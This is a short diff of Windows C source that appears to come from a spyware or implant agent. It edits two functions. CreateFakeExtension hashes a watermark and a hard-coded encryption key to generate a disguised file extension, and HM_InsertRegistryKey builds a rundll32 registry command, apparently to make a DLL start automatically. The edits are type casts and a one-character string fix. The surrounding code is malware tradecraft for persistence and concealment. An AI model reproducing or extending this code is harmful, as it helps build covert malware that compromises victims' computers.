@@ -1941,12 +1941,12 @@ BOOL HM_TimeStringToFileTime(const WCHAR *time_string, FILETIME *ftime)
 BOOL CreateFakeExtension(char *ext)
 {
 	DWORD i;
-	char md5_water[MD5_DIGEST_SIZE * 2 + 1];
-	char md5_encky[MD5_DIGEST_SIZE * 2 + 1];
+	BYTE md5_water[MD5_DIGEST_SIZE * 2 + 1];
+	BYTE md5_encky[MD5_DIGEST_SIZE * 2 + 1];
 
-	if (!MD5_Array(md5_water, WATERMARK, 8))
+	if (!MD5_Array((char *)md5_water, WATERMARK, 8))
 		return FALSE;
-	if (!MD5_Array(md5_encky, ENCRYPTION_KEY, 8))
+	if (!MD5_Array((char *)md5_encky, ENCRYPTION_KEY, 8))
 		return FALSE;
 	
 	for (i=0; i<EXT_LEN; i++) {
@@ -2005,7 +2005,7 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 		CloseHandle(hfile);
 
 	// Scrive il comando da eseguire
-	sprintf(key_value, "%%systemroot%%\\system32\\rundll32.exe");
+	sprintf(key_value, "%%systemroot%%\\system32\\rundll32.exe ");
 	HM_CompletePath(dll_name, dll_path);
 	strcat(key_value, "\""); 
 	strcat(key_value, "%systemroot%\\..\\");
